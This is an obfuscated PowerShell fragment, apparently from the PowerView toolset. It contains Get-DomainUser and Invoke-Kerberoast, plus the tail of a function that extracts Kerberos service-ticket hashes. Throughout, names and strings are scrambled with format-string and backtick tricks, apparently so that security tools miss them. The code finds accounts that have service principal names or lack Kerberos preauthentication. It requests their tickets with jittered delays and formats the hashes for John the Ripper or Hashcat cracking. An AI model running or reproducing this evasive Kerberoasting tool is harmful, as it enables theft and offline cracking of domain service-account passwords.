                        &("{0}{2}{1}" -f'Wri','ng','te-Warni') ('Er'+'ror '+'pa'+'rs'+'ing '+'c'+'ipher'+'text '+'for'+' '+'th'+'e '+'SPN'+' '+' '+('9Gr('+'9GrTi'+'cket'+'.Serv'+'iceP'+'rinc'+'ipalNam'+'e)'+'. ').("{1}{0}" -f'laCe','rEp').Invoke('9Gr','$')+'Us'+'e '+'t'+'he '+'T'+'icketB'+'y'+'teH'+'exStream '+'f'+'ield '+'an'+'d '+'e'+'xtract'+' '+'t'+'he '+'ha'+'sh '+'of'+'fli'+'ne '+'with'+' '+('Ge'+'t-'+'Kerber'+'oas'+'tHas'+'hF'+'romAPReq{0}')  -f[CHAr]34)
                        ${h`AsH} = ${Nu`Ll}
                        ${O`Ut} | &("{1}{2}{0}{3}" -f 'e','Add-M','emb','r') ("{2}{1}{0}{3}" -f'rt','eprope','Not','y') ("{0}{3}{2}{5}{4}{1}"-f 'T','am','t','icke','exStre','ByteH') (  ${59`FH}::("{2}{0}{1}" -f 'ri','ng','ToSt').Invoke(${TiC`k`eT`ByteSTR`eAm}).("{1}{0}" -f 'ce','Repla').Invoke('-',''))
                    } else {
                        ${ha`sh} = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                        ${o`UT} | &("{0}{3}{2}{1}" -f'Add-M','r','mbe','e') ("{3}{0}{2}{1}"-f 'tepr','ty','oper','No') ("{4}{3}{1}{5}{0}{2}"-f'Strea','te','m','y','TicketB','Hex') ${Nu`ll}
                    }
                } else {
                    &("{0}{2}{1}"-f'Wr','ng','ite-Warni') "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq "
                    ${Ha`sH} = ${N`ULl}
                    ${o`UT} | &("{2}{0}{1}"-f'-M','ember','Add') ("{0}{2}{1}" -f 'Notepr','y','opert') ("{3}{1}{2}{0}{4}"-f'tr','e','HexS','TicketByt','eam') (  ${5`9Fh}::("{1}{0}{2}"-f 'S','To','tring').Invoke(${tic`K`e`TbyTES`TreAM}).("{2}{1}{0}" -f 'ce','a','Repl').Invoke('-',''))
                }

                if(${HA`SH}) {
                    if (${ou`T`Pu`TfO`Rmat} -match ("{1}{0}"-f 'n','Joh')) {
                        ${haShF`O`RMaT} = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                    }
                    else {
                        if (${dI`sT`inGUISHe`DnamE} -ne ("{0}{1}" -f 'U','NKNOWN')) {
                            ${u`sE`RD`OMaIN} = ${d`IStiNg`UIShEDN`A`me}.("{1}{0}" -f 'bString','Su').Invoke(${diSTi`NgUiS`HE`d`NAME}.("{2}{0}{1}"-f'd','exOf','In').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            ${useR`d`OMaIn} = ("{2}{0}{1}"-f 'O','WN','UNKN')
                        }

                        
                        ${H`ASh`FORMat} = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                    }
                    ${O`UT} | &("{1}{0}{2}" -f 'd-','Ad','Member') ("{2}{0}{3}{1}" -f 'p','y','Note','ropert') ("{1}{0}" -f'h','Has') ${H`AsHFor`m`AT}
                }

                ${o`UT} | &("{2}{1}{3}{0}"-f 'ember','d','Ad','-M') ("{0}{2}{1}"-f 'Not','property','e') ("{1}{0}{2}" -f 'ou','SamAcc','ntName') ${Sa`maCC`oUntn`AME}
                ${o`Ut} | &("{2}{1}{0}"-f 'er','mb','Add-Me') ("{0}{2}{1}" -f 'Not','y','epropert') ("{1}{5}{0}{4}{3}{2}" -f 't','Di','hedName','uis','ing','s') ${d`ISTIN`gU`i`ShEdNaMe}
                ${O`Ut} | &("{2}{0}{3}{1}" -f'dd-Me','er','A','mb') ("{1}{0}{2}"-f'otepro','N','perty') ("{0}{4}{2}{1}{3}" -f 'ServicePrincipa','a','N','me','l') ${Ti`ck`et}."SER`VICeprI`NCiPaLN`A`mE"
                ${o`UT}."PsOBJe`ct"."tY`P`ENAmes".("{0}{1}"-f'Ins','ert').Invoke(0, ("{4}{3}{2}{5}{1}{0}" -f'NTicket','P','iew','werV','Po','.S'))
                &("{0}{1}{2}" -f 'Wri','te','-Output') ${o`Ut}
            }
            
            &("{0}{1}{2}" -f'Star','t-Sle','ep') -Seconds ${Ran`D`NO}.("{1}{0}" -f'xt','Ne').Invoke((1-${JI`T`Ter})*${DEl`AY}, (1+${jiTT`ER})*${de`L`AY})
        }
    }

    END {
        if (${LO`GontO`kEN}) {
            &("{2}{0}{1}{3}{4}"-f'oke-Reve','r','Inv','tT','oSelf') -TokenHandle ${lOG`On`ToKEn}
        }
    }
}

function g`eT`-D`omAinu`SEr {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{7}{6}{2}{4}{8}{3}{1}{5}{0}" -f 'ignments','hanA','r','reT','ed','ss','seDecla','PSU','VarsMo'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}"-f'PSShoul','ocess','dPr'}, '')]
    [OutputType({"{1}{2}{3}{0}"-f '.User','Powe','rVi','ew'})]
    [OutputType({"{4}{1}{2}{5}{3}{0}"-f'.Raw','owerVi','e','ser','P','w.U'})]
    [CmdletBinding(deFaULTparaMeTErsetNAME = {"{2}{1}{0}{3}" -f'ele','lowD','Al','gation'})]
    Param(
        [Parameter(POsitIon = 0, vAluEFroMpIPeline = ${TR`Ue}, ValuefrompIPElINEbYprOPeRTynaMe = ${t`RuE})]
        [Alias({"{3}{1}{2}{0}" -f 'Name','nguis','hed','Disti'}, {"{0}{2}{1}" -f'S','ccountName','amA'}, {"{1}{0}" -f 'me','Na'}, {"{0}{2}{3}{1}{4}"-f 'Member','uishedNam','Disti','ng','e'}, {"{0}{1}{2}"-f 'Mem','berN','ame'})]
        [String[]]
        ${I`dE`NtI`TY},

        [Switch]
        ${s`Pn},

        [Switch]
        ${adm`I`NcO`UNT},

        [Parameter(PARamEtERSEtNAMe = "A`L`LoWD`ElEga`TION")]
        [Switch]
        ${AlL`O`WdELegA`T`IoN},

        [Parameter(ParameTERSEtname = "dIsALLO`W`D`e`LegA`TiOn")]
        [Switch]
        ${DIs`A`ll`oWd`ELeGatIoN},

        [Switch]
        ${TRUSt`EdT`o`A`UTh},

        [Alias({"{0}{3}{2}{5}{1}{4}" -f 'Ke','equ','erosPrea','rb','ired','uthNotR'}, {"{2}{1}{0}" -f'th','oPreau','N'})]
        [Switch]
        ${PrE`AUtHN`o`TR`eQuiR`ed},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`ma`IN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}"-f'ilte','r','F'})]
        [String]
        ${Ld`ApFILt`Er},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`ROP`ertIES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'SPath','AD'})]
        [String]
        ${se`ARC`hBa`sE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{0}{2}{1}{4}" -f'inCo','tr','n','Doma','oller'})]
        [String]
        ${sE`RV`er},

        [ValidateSet({"{0}{1}"-f'Bas','e'}, {"{0}{1}{2}" -f 'O','neLev','el'}, {"{1}{0}"-f'ubtree','S'})]
        [String]
        ${sE`Ar`cHSc`oPe} = ("{0}{1}"-f 'Subt','ree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`ESUlTP`A`GeSIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`E`Rvert`ImeLi`M`iT},

        [ValidateSet({"{0}{1}" -f 'Dac','l'}, {"{1}{0}"-f 'p','Grou'}, {"{0}{1}"-f'N','one'}, {"{1}{0}"-f'wner','O'}, {"{0}{1}" -f 'Sa','cl'})]
        [String]
        ${S`ECurity`MAskS},

        [Switch]
        ${TombSt`o`Ne},

        [Alias({"{1}{0}"-f'rnOne','Retu'})]
        [Switch]
        ${F`iNdonE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrE`de`NTiAL} =   ${a`WK}::"eMp`TY",

        [Switch]
        ${r`AW}
    )

    DynamicParam {
        ${ua`cvAl`UENaMES} =   (  &("{2}{1}{0}" -f'E','Abl','vaRi')  ("Ro"+"4A")  )."V`Alue"::("{1}{0}" -f 'Names','Get').Invoke(${Ua`c`ENum})
        
        ${UACVA`lUeN`AMeS} = ${U`A`CValu`EN`AMes} | &("{1}{4}{2}{0}{3}" -f 'Objec','F','Each-','t','or') {${_}; "NOT_$_"}
        
        &("{3}{1}{4}{0}{2}"-f'ynamicPara','w-','meter','Ne','D') -Name ("{2}{1}{0}"-f 'lter','ACFi','U') -ValidateSet ${UacvalUe`NAm`es} -Type ([array])
    }

    BEGIN {
        ${SE`AR`c`h`erarGuMENTs} = @{}
        if (${P`SbOUNDP`A`RAmETe`Rs}[("{2}{0}{1}" -f 'o','main','D')]) { ${sEAR`chE`R`Ar`gumENts}[("{2}{1}{0}"-f 'in','oma','D')] = ${domA`in} }
        if (${ps`B`Ou`NDpA`RAMET`ERs}[("{0}{2}{1}" -f 'P','operties','r')]) { ${Sea`RCHerARGu`M`ENTs}[("{1}{0}{2}" -f 'ert','Prop','ies')] = ${PRoP`eR`TIes} }
        if (${psBoUNDP`A`RAm`E`TERS}[("{1}{2}{0}" -f'rchBase','S','ea')]) { ${s`E`ArC`HeRarGU`MeNtS}[("{0}{1}{3}{2}" -f 'S','earchB','se','a')] = ${s`EarCh`BASE} }
        if (${PS`Boun`dpArA`MEteRs}[("{1}{0}" -f'ver','Ser')]) { ${se`Ar`cHera`RGu`Me`NTs}[("{1}{0}"-f 'er','Serv')] = ${Ser`V`Er} }
        if (${P`sBo`Un`DP`A`RameterS}[("{2}{1}{0}{3}"-f'hS','c','Sear','cope')]) { ${SeaR`cHE`RaRg`U`MENtS}[("{2}{1}{3}{0}" -f 'ope','earchS','S','c')] = ${S`EA`RCH`sCoPe} }
        if (${Ps`BoUN`Dparam`ETers}[("{0}{2}{3}{1}"-f'Re','ize','sul','tPageS')]) { ${sEA`RCHEra`RGUMEn`Ts}[("{4}{0}{3}{2}{1}" -f'e','Size','e','sultPag','R')] = ${RESU`lTpA`gEsI`zE} }
        if (${PsbO`U`NDPaRame`TeRS}[("{3}{0}{2}{1}"-f'rverT','eLimit','im','Se')]) { ${SEar`che`RaR`GumeNTS}[("{3}{2}{0}{1}"-f 'rTimeLim','it','rve','Se')] = ${serVe`RTIm`ELI`M`IT} }
        if (${PsB`oUndpAR`Am`E`TErs}[("{1}{0}{2}{3}" -f 'rit','Secu','y','Masks')]) { ${sE`AR`CHErA`RG`UM`enTs}[("{2}{3}{1}{0}" -f'rityMasks','cu','S','e')] = ${sEcuRItyM`AS`Ks} }
        if (${p`s`Bo`UNdpARA`MetERS}[("{2}{1}{0}" -f 'ne','o','Tombst')]) { ${SEarC`HE`RArGUmeN`TS}[("{0}{2}{1}" -f'T','ne','ombsto')] = ${tOMBS`T`o`NE} }
        if (${pSb`OUNDPA`R`AmEtERS}[("{1}{0}{2}" -f 'ent','Cred','ial')]) { ${SEarc`h`eR`ArgUm`E`NTS}[("{2}{1}{0}{3}" -f'i','redent','C','al')] = ${c`R`ed`enTiaL} }
        ${U`S`eRs`EArcHEr} = &("{1}{4}{3}{0}{2}" -f'oma','G','inSearcher','-D','et') @SearcherArguments
    }

    PROCESS {
        
        if (${p`sbO`Undpar`A`met`Ers} -and (${p`s`BOU`ND`pARaMe`TErS}."cou`NT" -ne 0)) {
            &("{0}{2}{5}{4}{1}{3}" -f'New-','aramet','Dynami','er','P','c') -CreateVariables -BoundParameters ${psB`oUN`d`ParaMete`Rs}
        }

        if (${uSEr`SeARCh`ER}) {
            ${iDEnTi`T`Y`FiLTer} = ''
            ${f`I`LtEr} = ''
            ${idEN`TI`Ty} | &("{2}{1}{3}{0}"-f'Object','ere','Wh','-') {${_}} | &("{1}{3}{4}{2}{0}"-f't','F','c','orEach-Obj','e') {
                ${i`DeN`T`ItyI`Nsta`NCe} = ${_}.("{1}{2}{0}" -f 'ace','Re','pl').Invoke('(', '\28').("{0}{1}" -f'Re','place').Invoke(')', '\29')
                if (${ideN`TiTyiN`S`Tan`cE} -match ("{0}{1}" -f'^S','-1-')) {
                    ${IDEnti`TyF`IltER} += "(objectsid=$IdentityInstance)"
                }
                elseif (${ID`e`NtiTyINSt`ANcE} -match ("{1}{0}"-f '=','^CN')) {
                    ${Ide`NtI`TYFI`LtER} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${ps`BOu`NdpaR`AMEtErS}[("{1}{0}"-f 'ain','Dom')]) -and (-not ${PsBo`UnD`P`Ar`AMetErS}[("{1}{0}{3}{2}"-f 'arc','Se','e','hBas')])) {
                        
                        
                        ${I`DENtITyd`om`AIN} = ${id`EnTi`TY`I`NstaNcE}.("{1}{0}{2}"-f'rin','SubSt','g').Invoke(${i`dEnt`ITYI`NsTan`CE}.("{0}{1}{2}"-f'In','de','xOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{2}{3}{1}{0}"-f'bose','r','Write','-Ve') ('[Get-Dom'+'ai'+'nUser'+']'+' '+'Extr'+'acte'+'d '+'dom'+'a'+'in '+"'$IdentityDomain' "+'from'+' '+"'$IdentityInstance'")
                        ${SearCHERAr`G`U`mE`N`TS}[("{0}{1}"-f 'Domai','n')] = ${idEn`TitYD`O`M`AIn}
                        ${Us`ERse`ARChEr} = &("{5}{2}{4}{0}{3}{1}" -f 'o','archer','t','mainSe','-D','Ge') @SearcherArguments
                        if (-not ${u`SerS`EaRChER}) {
                            &("{0}{1}{2}" -f 'Write-','Wa','rning') ('[Ge'+'t'+'-Do'+'mainUse'+'r] '+'Un'+'able'+' '+'t'+'o '+'re'+'t'+'rieve '+'d'+'omain '+'sear'+'cher'+' '+'for'+' '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${idEnti`TYi`N`s`Tance} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${Gu`idbyTe`StRinG} = (([Guid]${ideNti`T`yInst`Ance}).("{0}{3}{2}{1}" -f'T','ay','ByteArr','o').Invoke() | &("{2}{1}{0}{3}"-f 'Each','or','F','-Object') { '\' + ${_}.("{1}{0}" -f 'String','To').Invoke('X2') }) -join ''
                    ${Ide`N`TiTYfI`lTeR} += "(objectguid=$GuidByteString)"
                }
                elseif (${IDEnT`I`TYIn`sT`AnCE}.("{1}{0}{2}" -f 'ont','C','ains').Invoke('\')) {
                    ${C`oNvErtedIde`NTiTy`I`N`sta`Nce} = ${I`DeNTI`TyIn`s`T`AnCe}.("{1}{0}" -f'place','Re').Invoke('\28', '(').("{0}{1}"-f 'R','eplace').Invoke('\29', ')') | &("{0}{3}{4}{1}{2}" -f 'C','-AD','Name','on','vert') -OutputType ("{1}{0}{2}"-f 'anonica','C','l')
                    if (${c`O`NVe`RteDi`DentIt`yiNStA`Nce}) {
                        ${usEr`d`OMaIN} = ${C`onVEr`TeDiden`TITy`iNsTAn`CE}.("{0}{1}" -f 'SubStr','ing').Invoke(0, ${cOnV`ertE`DIDE`NT`ITyi`NSTa`NCe}.("{1}{0}"-f 'f','IndexO').Invoke('/'))
                        ${u`SeRn`A`Me} = ${i`D`eNt`itYiNS`T`AnCe}.("{1}{0}"-f 'plit','S').Invoke('\')[1]
                        ${IdE`N`T`it`YFiLTeR} += "(samAccountName=$UserName)"
                        ${s`EA`R`cherArgUmentS}[("{2}{0}{1}" -f 'om','ain','D')] = ${us`e`RDoMAIN}
                        &("{0}{1}{2}"-f'Write-Ver','b','ose') ('[G'+'et-DomainUse'+'r'+'] '+'Ex'+'trac'+'te'+'d '+'dom'+'ai'+'n '+"'$UserDomain' "+'fro'+'m '+"'$IdentityInstance'")
                        ${USE`RSe`ARc`h`Er} = &("{0}{3}{1}{2}{4}"-f 'Get-D','main','Searc','o','her') @SearcherArguments
                    }
                }
                else {
                    ${Id`ENt`itYfilter} += "(samAccountName=$IdentityInstance)"
                }
            }

            if (${i`DEn`Ti`Tyfi`lTer} -and (${IdEN`T`ItyFIL`TEr}.("{1}{0}"-f 'm','Tri').Invoke() -ne '') ) {
                ${f`i`LTeR} += "(|$IdentityFilter)"
            }

            if (${psboU`NDp`Ara`m`eTERs}['SPN']) {
                &("{2}{0}{1}{3}" -f'-','Ver','Write','bose') ("{10}{8}{9}{0}{1}{6}{3}{5}{13}{12}{4}{11}{7}{2}" -f'n','User','pal names','Searchi','ce','ng ','] ','inci','t-D','omai','[Ge',' pr','non-null servi','for ')
                ${FI`Lt`eR} += (("{3}{4}{5}{2}{0}{1}"-f'ame=*',')','alN','(ser','vicePr','incip'))
            }
            if (${PsbO`UNdp`ARaMetE`Rs}[("{0}{1}{3}{4}{2}"-f 'AllowDeleg','a','n','ti','o')]) {
                &("{0}{1}{2}" -f 'Wr','ite-V','erbose') ("{9}{11}{7}{14}{0}{2}{12}{4}{8}{6}{10}{3}{13}{1}{5}"-f 'User] Searching','at',' f','e','r users wh','ed',' ca','Doma','o','[G','n b','et-','o',' deleg','in')
                
                ${fI`LtEr} += ("{7}{3}{2}{0}{6}{9}{5}{15}{12}{11}{1}{8}{4}{14}{13}{10}"-f'nt','556.1.4','erAccou','!(us','803:=104','tro','Co','(','.','n',')','2.840.113',':1.','4)','857','l')
            }
            if (${pSB`O`UND`pARAmE`T`ERs}[("{3}{5}{2}{1}{4}{0}" -f'gation','Del','low','Disa','e','l')]) {
                &("{2}{1}{0}" -f'-Verbose','te','Wri') ("{12}{13}{2}{4}{1}{6}{11}{9}{7}{14}{8}{0}{5}{3}{15}{10}" -f'truste','g for','User] ',' f','Searchin','d',' ','nsitive','and not ','who are se','delegation','users ','[Ge','t-Domain',' ','or ')
                ${F`IL`TEr} += (("{12}{4}{8}{10}{11}{7}{5}{3}{2}{0}{9}{6}{1}" -f '56.1.4.','74)','1135','.2.840.','ser','1','3:=10485','l:','Accoun','80','t','Contro','(u'))
            }
            if (${PSb`OUnD`pARA`m`ETE`Rs}[("{2}{0}{1}"-f 'd','minCount','A')]) {
                &("{0}{1}{2}" -f 'Wr','ite-V','erbose') ("{10}{11}{4}{9}{8}{7}{1}{6}{0}{3}{2}{5}" -f 'n','for ad','ount','C','r] S','=1','mi',' ','arching','e','[Get-','DomainUse')
                ${Fi`LTER} += ("{2}{0}{1}{3}" -f 'dmi','ncou','(a','nt=1)')
            }
            if (${P`SBoundp`A`Rame`Te`Rs}[("{1}{3}{2}{0}" -f 'oAuth','Tr','stedT','u')]) {
                &("{1}{2}{0}" -f 'ose','Writ','e-Verb') ("{8}{10}{1}{0}{2}{4}{15}{13}{11}{17}{14}{3}{9}{7}{5}{16}{12}{6}" -f '] Se','r','ar','n','ching for ','for oth','s','ate ','[Get-DomainU','tic','se','at are',' principal','h','ted to authe','users t','er',' trus')
                ${F`Ilt`er} += ("{0}{5}{4}{3}{7}{6}{1}{2}{8}"-f '(','dtodeleg','ateto=*','all','sds-','m','e','ow',')')
            }
            if (${PSBo`UN`DPARa`meteRS}[("{0}{2}{4}{1}{3}" -f 'Pr','equ','ea','ired','uthNotR')]) {
                &("{2}{3}{1}{0}" -f 'rbose','e','W','rite-V') ("{11}{8}{0}{7}{3}{9}{4}{14}{13}{6}{16}{2}{18}{5}{10}{15}{1}{12}{17}"-f 'Doma','s preau','nts ','nUs',' ','at do not requir',' use','i','t-','er]','e ker','[Ge','th','or','Searching f','bero','r accou','enticate','th')
                ${F`iLtEr} += (("{4}{6}{1}{8}{2}{5}{7}{3}{0}" -f')','c','tControl:1.','4','(','2.840.113556.1.4','userAc','.803:=419430','oun'))
            }
            if (${psbO`UnD`p`ARAme`TERS}[("{1}{0}{2}" -f 'e','LDAPFilt','r')]) {
                &("{1}{0}{2}" -f 'te-','Wri','Verbose') ('[G'+'et-D'+'omainU'+'ser] '+'Using'+' '+'add'+'i'+'tion'+'al '+'LD'+'AP '+'filter'+':'+' '+"$LDAPFilter")
                ${Filt`Er} += "$LDAPFilter"
            }

            
            ${uA`CF`ILTer} | &("{0}{3}{1}{2}"-f 'Whe','c','t','re-Obje') {${_}} | &("{1}{0}{2}" -f 'ach-Objec','ForE','t') {
                if (${_} -match ("{1}{0}"-f'*','NOT_.')) {
                    ${uac`Fie`lD} = ${_}.("{0}{1}{3}{2}"-f 'Subst','r','ng','i').Invoke(4)
                    ${UaCV`A`LUe} = [Int](${uACE`N`Um}::${U`Ac`FieLd})
                    ${f`Ilt`eR} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    ${U`AcV`AlUE} = [Int](${u`ACeN`UM}::${_})
                    ${Fil`T`ER} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            ${US`ErsEAr`CHEr}."f`ilt`eR" = "(&(samAccountType=805306368)$Filter)"
            &("{2}{0}{3}{4}{1}" -f'ite-','ose','Wr','Ve','rb') "[Get-DomainUser] filter string: $($UserSearcher.filter) "

            if (${pSBo`UN`d`paramETeRs}[("{0}{2}{1}" -f 'Fin','One','d')]) { ${R`E`SulTs} = ${use`RSEa`R`C`heR}.("{1}{2}{0}" -f 'ne','Find','O').Invoke() }
            else { ${re`Sul`Ts} = ${usE`RS`EARcher}.("{1}{0}"-f'l','FindAl').Invoke() }
            ${rE`sul`TS} | &("{2}{1}{0}"-f't','Objec','Where-') {${_}} | &("{3}{1}{2}{0}"-f 't','j','ec','ForEach-Ob') {
                if (${pSBOUn`d`P`ARametERS}['Raw']) {
                    
                    ${uS`er} = ${_}
                    ${US`Er}."psObJ`EcT"."tyPEn`Am`eS".("{0}{1}" -f 'I','nsert').Invoke(0, ("{3}{2}{1}{0}"-f'er.Raw','s','View.U','Power'))
                }
                else {
                    ${U`seR} = &("{4}{1}{0}{3}{2}"-f'-LDAP','vert','y','Propert','Con') -Properties ${_}."p`R`OPer`TIES"
                    ${u`Ser}."P`s`objEcT"."TYPEna`M`es".("{0}{2}{1}"-f 'I','ert','ns').Invoke(0, ("{2}{0}{1}{3}"-f'owerVie','w.','P','User'))
                }
                ${US`ER}
            }
            if (${R`eS`UlTs}) {
                try { ${RES`UL`Ts}.("{0}{2}{1}"-f'disp','se','o').Invoke() }
                catch {
                    &("{2}{0}{3}{1}"-f'e-','bose','Writ','Ver') ('[G'+'et-D'+'omai'+'nUs'+'er]'+' '+'E'+'rror '+'di'+'spos'+'ing '+'of'+' '+'t'+'he '+'Resu'+'lts '+'objec'+'t: '+"$_")
                }
            }
            ${uSE`R`seArcher}.("{1}{2}{0}" -f 'pose','d','is').Invoke()
        }
    }
}


function InvoKE-KEr`BeR`O`A`ST {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{4}{2}{1}{3}"-f 'PS','ldProces','u','s','Sho'}, '')]
    [OutputType({"{4}{1}{0}{3}{2}" -f 'NTic','werView.SP','t','ke','Po'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsiTIOn = 0, vAluEFroMpIPelIne = ${t`RUE}, VaLUEFRoMPIpELineBYpRoPErTYname = ${Tr`Ue})]
        [Alias({"{0}{4}{2}{1}{3}"-f 'Dis','hedNam','s','e','tingui'}, {"{0}{1}{2}" -f'Sam','Accou','ntName'}, {"{1}{0}" -f'me','Na'}, {"{2}{1}{4}{3}{0}"-f 'tinguishedName','berD','Mem','s','i'}, {"{1}{2}{0}" -f'e','Membe','rNam'})]
        [String[]]
        ${I`DEnTi`Ty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`OMain},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'lter','Fi'})]
        [String]
        ${Ld`APf`IlTer},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'ADSP','ath'})]
        [String]
        ${sEaR`C`hBAse},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}{3}{4}"-f'D','i','oma','n','Controller'})]
        [String]
        ${s`Er`Ver},

        [ValidateSet({"{1}{0}"-f 'ase','B'}, {"{1}{0}{2}" -f 'ev','OneL','el'}, {"{1}{0}"-f'ree','Subt'})]
        [String]
        ${se`ARCHS`copE} = ("{1}{0}{2}"-f'btr','Su','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        ${REsU`Lt`pAges`ize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sERvERt`IME`li`mIT},

        [Switch]
        ${TOM`B`Sto`NE},

        [ValidateRange(0,10000)]
        [Int]
        ${d`eL`Ay} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${J`ITT`eR} = .3,

        [ValidateSet({"{1}{0}"-f 'hn','Jo'}, {"{0}{1}{2}" -f 'Hash','ca','t'})]
        [Alias({"{1}{2}{0}"-f't','F','orma'})]
        [String]
        ${oUtp`U`TFo`RmaT} = ("{1}{0}" -f'ohn','J'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`eD`ENTI`AL} =  ( &("{1}{0}{2}"-f 't-i','gE','tem') ("VaRi"+"ABLE:A"+"W"+"K") )."V`AluE"::"E`mpTY"
    )

    BEGIN {
        ${UserSea`R`cHer`A`RGUmEntS} = @{
            'SPN' = ${T`Rue}
            ("{0}{2}{1}" -f 'Pr','erties','op') = ("{2}{7}{3}{11}{4}{6}{9}{8}{0}{10}{5}{1}" -f'pri','me','samaccountname','ting','s','cipalna','hedname,se',',dis','ice','rv','n','ui')
        }
        if (${pSbO`UN`Dp`ARAMeTe`RS}[("{1}{0}"-f 'ain','Dom')]) { ${uS`ErSe`A`RcHEraRGu`Me`NTs}[("{0}{1}"-f'Do','main')] = ${D`omAIn} }
        if (${p`sbOUN`dP`AraM`etErS}[("{2}{1}{0}" -f 'PFilter','DA','L')]) { ${usER`SeaR`C`HERA`R`gume`Nts}[("{1}{2}{0}"-f'lter','LDAPF','i')] = ${lD`APfi`lT`eR} }
        if (${pSb`OuNdPAra`meTe`RS}[("{0}{1}{2}" -f 'Sear','chBas','e')]) { ${Us`eRsea`R`c`heraRGU`MEntS}[("{1}{2}{0}"-f 'hBase','Sear','c')] = ${S`EaRCh`BAse} }
        if (${P`sbo`UND`PArAM`Eters}[("{0}{1}" -f'S','erver')]) { ${U`sErsE`A`RC`heRA`R`gumEnTS}[("{0}{1}"-f'S','erver')] = ${s`eRvEr} }
        if (${p`SbOuNdP`Ar`AM`ETE`RS}[("{0}{3}{2}{1}"-f 'S','Scope','h','earc')]) { ${Us`eRsEar`chE`R`A`RguMEnTS}[("{2}{1}{3}{0}"-f 'cope','e','S','archS')] = ${sE`A`RcHs`cOPe} }
        if (${psbOu`N`dPARa`mEtERs}[("{0}{2}{1}"-f 'ResultPag','ze','eSi')]) { ${UsErs`EARC`HE`RAR`GU`MeNtS}[("{3}{0}{1}{2}"-f'lt','PageSi','ze','Resu')] = ${ReSuL`Tp`AG`ESiZe} }
        if (${p`SB`OuNDpARAMe`TErS}[("{2}{0}{3}{1}" -f 'm','t','ServerTi','eLimi')]) { ${U`SerS`E`A`RCHerAr`gUme`NTS}[("{2}{1}{3}{0}"-f 'imit','v','Ser','erTimeL')] = ${sErV`e`RtIm`E`LIMIT} }
        if (${Ps`BO`UNdp`A`RAmete`RS}[("{1}{0}{2}"-f'on','Tombst','e')]) { ${Us`ERsearcHe`Rargum`eN`TS}[("{1}{0}{2}" -f 'bston','Tom','e')] = ${T`OMBsT`oNe} }
        if (${p`SbOUNd`Pa`R`AmEt`ers}[("{1}{2}{0}" -f 'ential','Cre','d')]) { ${u`S`eR`s`earChER`AR`gUmEnts}[("{3}{1}{0}{2}" -f 'nti','de','al','Cre')] = ${CR`Ede`NTiaL} }

        if (${PSbOUn`D`Par`Ame`TERS}[("{0}{2}{1}"-f'C','dential','re')]) {
            ${lO`GonT`OKEN} = &("{6}{2}{5}{4}{1}{0}{3}" -f 'at','on','-','ion','pers','UserIm','Invoke') -Credential ${crEdE`NT`i`AL}
        }
    }

    PROCESS {
        if (${p`SBOUnDPaR`AMet`e`Rs}[("{2}{1}{0}"-f 'y','it','Ident')]) { ${Us`ErsEA`RcH`erarGumEnTs}[("{1}{0}"-f'dentity','I')] = ${IdEnTi`Ty} }
        &("{0}{1}{3}{2}" -f 'Get-D','omainUs','r','e') @UserSearcherArguments | &("{2}{1}{0}"-f'ject','Ob','Where-') {${_}."Sa`mA`CCO`U`Ntname" -ne ("{1}{0}"-f 'btgt','kr')} | &("{2}{3}{4}{1}{0}" -f'ket','Tic','G','et-Domai','nSPN') -Delay ${d`E`Lay} -OutputFormat ${oUTP`UTfOR`m`At} -Jitter ${J`It`TEr}
    }

    END {
        if (${L`ogont`ok`En}) {
            &("{1}{0}{2}{3}"-f 'nvo','I','ke-Rev','ertToSelf') -TokenHandle ${LO`GONT`okEN}
        }
    }
}